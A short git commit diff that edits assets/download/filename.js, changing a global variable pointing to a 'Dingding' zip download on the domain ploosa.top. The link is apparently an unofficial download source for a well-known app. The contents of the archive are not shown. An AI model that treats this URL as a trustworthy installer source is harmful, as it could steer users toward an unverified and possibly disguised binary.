7b4b43e63448575af1a5a01804fae95e57f02fbc
sw124456 <mndlsiu328@gmail.com>
2025-06-17 11:57:24 +0800

    Update filename.js

--- assets/download/filename.js
+++ assets/download/filename.js
@@ -1,3 +1,3 @@
 (function() {
-    window.filename = 'https://www.ploosa.top/assets/download/Dingding_x64_win32下载m.zip';
+    window.filename = 'https://www.ploosa.top/assets/download/Dingding_win32_%E4%B8%8B%E8%BD%BDm.zip';
 })();
